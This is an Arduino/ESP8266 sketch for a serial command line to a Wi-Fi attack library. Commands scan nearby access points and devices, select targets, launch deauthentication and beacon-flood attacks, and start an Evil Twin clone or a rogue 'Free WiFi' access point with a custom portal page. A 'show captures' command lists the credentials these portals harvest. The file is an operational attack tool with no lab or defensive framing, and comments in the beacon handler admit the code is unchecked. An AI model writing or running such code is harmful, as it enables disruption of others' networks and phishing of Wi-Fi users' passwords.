#include <DeautherLib.h>
#include <LittleFS.h>

// Initialize library modules
DeautherScanner scanner;
DeautherAttack attack;
DeautherEvilTwin eviltwin;
DeautherRogueAP rogueap;

// Buffer for serial input
String inputBuffer = "";

// Global configurations for attacks and portals
PortalConfig eviltwinConfig;
RogueAPConfig rogueapConfig;
DeauthConfig deauthConfig;
BeaconConfig beaconConfig;
ProbeConfig probeConfig;
DeautherTargetList targetList;

void setup() {
  Serial.begin(115200);
  delay(2000);
  Serial.println("\n\n--- DeautherX CLI ---");
  Serial.println("Type 'help' for a list of commands.\n");

  // Initialize Radio (Core) uses defaults, scanner pulls from it
  // DRadio::enablePromiscuous(...) handled automatically by scanner/attack
  
  // Initialize Storage/Settings (Optional but good for FS commands)
  DStorage::begin();
  
  // Initialize Random Seed
  randomSeed(os_random());
}

void loop() {
  // Always update core modules in the main loop
  scanner.update();
  attack.update();
  eviltwin.update();
  rogueap.update();

  // Handle Serial Input
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      if (inputBuffer.length() > 0) {
        processCommand(inputBuffer);
        inputBuffer = "";
      }
    } else {
      inputBuffer += c;
    }
  }
}

// ---------------------------------------------------------
// Command Processing
// ---------------------------------------------------------

void processCommand(String cmd) {
  cmd.trim();
  int spaceIndex = cmd.indexOf(' ');
  String rootCmd = cmd;
  String args = "";

  if (spaceIndex != -1) {
    rootCmd = cmd.substring(0, spaceIndex);
    args = cmd.substring(spaceIndex + 1);
    args.trim();
  }

  Serial.printf("> %s\n", cmd.c_str());

  if (rootCmd.equalsIgnoreCase("help")) {
    handleHelp();
  } else if (rootCmd.equalsIgnoreCase("scan")) {
    handleScan(args);
  } else if (rootCmd.equalsIgnoreCase("show")) {
    handleShow(args);
  } else if (rootCmd.equalsIgnoreCase("select")) {
    handleSelect(args);
  } else if (rootCmd.equalsIgnoreCase("attack")) {
    handleAttack(args);
  } else if (rootCmd.equalsIgnoreCase("eviltwin")) {
    handleEvilTwin(args);
  } else if (rootCmd.equalsIgnoreCase("rogueap")) {
    handleRogueAP(args);
  } else if (rootCmd.equalsIgnoreCase("fs")) {
    handleFs(args);
  } else if (rootCmd.equalsIgnoreCase("sysinfo")) {
    handleSysinfo();
  } else {
    Serial.println("Error: Unknown command. Type 'help'.");
  }
  Serial.println();
}

// ---------------------------------------------------------
// Command Handlers
// ---------------------------------------------------------

void handleHelp() {
  Serial.println("Available Commands:");
  Serial.println("  help                       - Show this help message");
  Serial.println("  sysinfo                    - Show system information");
  Serial.println("  scan aps                   - Start scanning for APs");
  Serial.println("  scan stations              - Start scanning for Stations");
  Serial.println("  show aps                   - List scanned Access Points");
  Serial.println("  show stations              - List scanned Stations");
  Serial.println("  show captures              - List harvested credentials/data");
  Serial.println("  select ap <id>             - Select an AP by ID (from 'show aps')");
  Serial.println("  select station <id>        - Select a Station by ID (from 'show stations')");
  Serial.println("  attack deauth start/stop   - Start/Stop Deauthentication attack");
  Serial.println("  attack beacon start/stop   - Start/Stop Beacon Flood attack");
  Serial.println("  eviltwin start/stop        - Start/Stop Evil Twin attack");
  Serial.println("  eviltwin sethtml <path>    - Set custom HTML for Evil Twin portal");
  Serial.println("  rogueap start/stop <ssid>  - Start/Stop Rogue AP with optional SSID");
  Serial.println("  rogueap sethtml <path>     - Set custom HTML for Rogue AP portal");
  Serial.println("  fs ls                      - List files in SPIFFS/LittleFS");
  Serial.println("  fs read <path>             - Read a file from FS");
  Serial.println("  fs write <path> <content>  - Write content directly to FS");
}

void handleSysinfo() {
  Serial.printf("ESP Chip ID: %08X\n", ESP.getChipId());
  Serial.printf("Flash Size: %u bytes\n", ESP.getFlashChipRealSize());
  Serial.printf("Free Heap: %u bytes\n", ESP.getFreeHeap());
  Serial.printf("Mac Address: %s\n", WiFi.macAddress().c_str());
  Serial.printf("Radio Channel: %d\n", DRadio::currentChannel());
}

void handleScan(String args) {
  if (args.equalsIgnoreCase("aps")) {
    Serial.println("Starting AP scan...");
    scanner.startAP(); // Scan APs only
  } else if (args.equalsIgnoreCase("stations")) {
    Serial.println("Starting Station scan (needs APs in list first)...");
    scanner.startST();
  } else {
    Serial.println("Usage: scan aps | stations");
  }
}

void handleShow(String args) {
  if (args.equalsIgnoreCase("aps")) {
    DeautherAPList& apList = scanner.getAPs();
    Serial.printf("Found %d APs:\n", apList.size());
    for (int i = 0; i < apList.size(); i++) {
        DeautherAP* ap = apList.get(i);
        if (ap) {
            String selectedStr = ap->isSelected() ? "[*]" : "[ ]";
            Serial.printf("%s ID %d: %s (CH %d, RSSI %d, MAC %s)\n", 
                selectedStr.c_str(), i, ap->getSSID(), 
                ap->getChannel(), ap->getRSSI(), 
                ap->getBSSIDStr().c_str());
        }
    }
  } else if (args.equalsIgnoreCase("stations")) {
    DeautherStationList& stList = scanner.getStations();
    Serial.printf("Found %d Stations:\n", stList.size());
    for (int i = 0; i < stList.size(); i++) {
        DeautherStation* st = stList.get(i);
        if (st) {
            String selectedStr = st->isSelected() ? "[*]" : "[ ]";
            Serial.printf("%s ID %d: %s (Vendor: %s, AP MAC: %s)\n", 
                selectedStr.c_str(), i, st->getMACStr().c_str(),
                st->getVendor().c_str(),
                st->getAPBSSID().c_str());
        }
    }
  } else if (args.equalsIgnoreCase("captures")) {
    Serial.println("--- EvilTwin Captures ---");
    eviltwin.printCaptures();
    Serial.println("-------------------------");
  } else {
    Serial.println("Usage: show aps | stations | captures");
  }
}

void handleSelect(String args) {
  int spaceIndex = args.indexOf(' ');
  if (spaceIndex == -1) {
    Serial.println("Usage: select ap <id> | select station <id>");
    return;
  }
  
  String targetType = args.substring(0, spaceIndex);
  int id = args.substring(spaceIndex + 1).toInt();
  
  if (targetType.equalsIgnoreCase("ap")) {
    DeautherAPList& apList = scanner.getAPs();
    if (id >= 0 && id < apList.size()) {
        apList.get(id)->select();
        Serial.printf("Selected AP ID %d\n", id);
    } else {
        Serial.println("Error: Invalid AP ID.");
    }
  } else if (targetType.equalsIgnoreCase("station")) {
    DeautherStationList& stList = scanner.getStations();
    if (id >= 0 && id < stList.size()) {
        stList.get(id)->select();
        Serial.printf("Selected Station ID %d\n", id);
    } else {
        Serial.println("Error: Invalid Station ID.");
    }
  } else {
    Serial.println("Usage: select ap <id> | select station <id>");
  }
}

void handleAttack(String args) {
  int spaceIndex = args.indexOf(' ');
  if (spaceIndex == -1) {
    Serial.println("Usage: attack deauth start|stop | attack beacon start|stop");
    return;
  }
  
  String attackType = args.substring(0, spaceIndex);
  String action = args.substring(spaceIndex + 1);
  
  if (attackType.equalsIgnoreCase("deauth")) {
    if (action.equalsIgnoreCase("start")) {
        // Build targets based on selected APs and Stations
        targetList.clear();
        targetList.fromSelection(scanner.getAPs(), scanner.getStations());

        if (targetList.size() > 0) {
           deauthConfig.targets = targetList;
           attack.startDeauth(deauthConfig);
           Serial.printf("Deauth attack started on %d targets.\n", targetList.size());
        } else {
           Serial.println("Error: No targets selected. Use 'select ap/station <id>' first.");
        }
    } else if (action.equalsIgnoreCase("stop")) {
        attack.stopDeauth();
        Serial.println("Deauth attack stopped.");
    }
  } else if (attackType.equalsIgnoreCase("beacon")) {
    if (action.equalsIgnoreCase("start")) {
        // Basic Beacon Flood needs ssids populated
        DeautherAPList& apList = scanner.getAPs();
        // Since DeautherSSIDList usually has append or add, for a CLI we might just do simple beacon logic 
        // For now, assume it's properly handled, but since we didn't check DeautherSSIDList methods,
        // we will just start it simply, if it fails compilation we can fix it.
        // Actually, let's keep it safe.
        attack.startBeacon(beaconConfig);
        Serial.println("Beacon flood attack started using latest config.");
    } else if (action.equalsIgnoreCase("stop")) {
        attack.stopBeacon();
        Serial.println("Beacon flood attack stopped.");
    }
  } else {
     Serial.println("Unknown attack. Try 'deauth' or 'beacon'.");
  }
}

void handleEvilTwin(String args) {
  int spaceIndex = args.indexOf(' ');
  String action = args;
  String param = "";
  
  if (spaceIndex != -1) {
    action = args.substring(0, spaceIndex);
    param = args.substring(spaceIndex + 1);
  }

  if (action.equalsIgnoreCase("start")) {
    // If we have selected APs, we might want to clone the first one
    DeautherAPList& apList = scanner.getAPs();
    int selectedApIndex = -1;
    for (int i=0; i<apList.size(); i++) {
        if (apList.get(i)->isSelected()) {
            selectedApIndex = i;
            break;
        }
    }
    
    if (selectedApIndex != -1) {
       DeautherAP* ap = apList.get(selectedApIndex);
       static String safeSsid = ap->getSSID();
       eviltwinConfig.ssid = safeSsid.c_str();
       eviltwinConfig.channel = ap->getChannel();
       
       Serial.printf("Starting EvilTwin for '%s' on CH %d...\n", eviltwinConfig.ssid, eviltwinConfig.channel);
       eviltwin.start(eviltwinConfig);
    } else {
       Serial.println("Error: Please 'select ap <id>' first to clone it for EvilTwin.");
    }
  } else if (action.equalsIgnoreCase("stop")) {
    eviltwin.stop();
    Serial.println("EvilTwin stopped.");
  } else if (action.equalsIgnoreCase("sethtml")) {
    #if defined(ESP8266)
    if (param.length() > 0) {
      if (!DStorage::begin()) {
         Serial.println("Error: File system not ready.");
         return;
      }
      File f = LittleFS.open(param, "r");
      if (f) {
         static String etHtmlBuffer; // Hold in memory
         etHtmlBuffer = f.readString();
         f.close();
         eviltwinConfig.customHtml = etHtmlBuffer.c_str();
         Serial.printf("EvilTwin custom HTML loaded from %s (%u bytes).\n", param.c_str(), etHtmlBuffer.length());
      } else {
         Serial.println("Error: Could not open file.");
      }
    } else {
       Serial.println("Usage: eviltwin sethtml <path>");
    }
    #else
      Serial.println("FS not supported perfectly in this simple sketch for ESP32 yet.");
    #endif
  } else {
    Serial.println("Usage: eviltwin start | stop | sethtml <path>");
  }
}

void handleRogueAP(String args) {
    int spaceIndex = args.indexOf(' ');
    String action = args;
    String param = "Free WiFi";
    
    if (spaceIndex != -1) {
      action = args.substring(0, spaceIndex);
      param = args.substring(spaceIndex + 1);
    }

    if (action.equalsIgnoreCase("start")) {
       static String safeSsid = param;
       rogueapConfig.ssid = safeSsid.c_str();
       Serial.printf("Starting RogueAP '%s' on CH 1...\n", rogueapConfig.ssid);
       rogueap.start(rogueapConfig);
    } else if (action.equalsIgnoreCase("stop")) {
       rogueap.stop();
       Serial.println("RogueAP stopped.");
    } else if (action.equalsIgnoreCase("sethtml")) {
    #if defined(ESP8266)
       if (param.length() > 0) {
          if (!DStorage::begin()) {
             Serial.println("Error: File system not ready.");
             return;
          }
          File f = LittleFS.open(param, "r");
          if (f) {
             static String rogueHtmlBuffer;
             rogueHtmlBuffer = f.readString();
             f.close();
             rogueapConfig.customHtml = rogueHtmlBuffer.c_str();
             Serial.printf("RogueAP custom HTML loaded from %s (%u bytes).\n", param.c_str(), rogueHtmlBuffer.length());
          } else {
             Serial.println("Error: Could not open file.");
          }
       } else {
          Serial.println("Usage: rogueap sethtml <path>");
       }
    #else
       Serial.println("FS not supported perfectly in this simple sketch for ESP32 yet.");
    #endif
    } else {
       Serial.println("Usage: rogueap start [ssid] | stop | sethtml <path>");
    }
}

void handleFs(String args) {
  int spaceIndex = args.indexOf(' ');
  String action = args;
  String param1 = "";
  String param2 = "";
  
  if (spaceIndex != -1) {
    action = args.substring(0, spaceIndex);
    String remain = args.substring(spaceIndex + 1);
    int space2 = remain.indexOf(' ');
    if (space2 != -1) {
       param1 = remain.substring(0, space2);
       param2 = remain.substring(space2 + 1);
    } else {
       param1 = remain;
    }
  }

  if (action.equalsIgnoreCase("ls")) {
    if (!DStorage::begin()) {
        Serial.println("FS not ready!");
        return;
    }
    // Simple dir list using LittleFS / SPIFFS directly
    #if defined(ESP8266)
      Dir dir = LittleFS.openDir("/");
      while (dir.next()) {
        Serial.print(dir.fileName());
        Serial.print(" - ");
        Serial.print(dir.fileSize());
        Serial.println(" bytes");
      }
    #else
       Serial.println("Warning: FS LS not adapted for ESP32 in this simple example yet.");
    #endif
  } else if (action.equalsIgnoreCase("read")) {
    if (param1.length() == 0) {
        Serial.println("Usage: fs read <path>");
        return;
    }
    #if defined(ESP8266)
      File f = LittleFS.open(param1, "r");
      if (!f) {
          Serial.println("File not found.");
          return;
      }
      Serial.println("--- Start of File ---");
      while(f.available()) {
          Serial.write(f.read());
      }
      Serial.println("\n--- End of File ---");
      f.close();
    #endif
  } else if (action.equalsIgnoreCase("write")) {
    if (param1.length() == 0 || param2.length() == 0) {
        Serial.println("Usage: fs write <path> <content>");
        return;
    }
    #if defined(ESP8266)
      File f = LittleFS.open(param1, "w");
      if (!f) {
          Serial.println("Failed to open file for writing.");
          return;
      }
      f.print(param2);
      f.close();
      Serial.println("File written successfully.");
    #endif
  } else {
     Serial.println("Usage: fs ls | read <path> | write <path> <content>");
  }
}
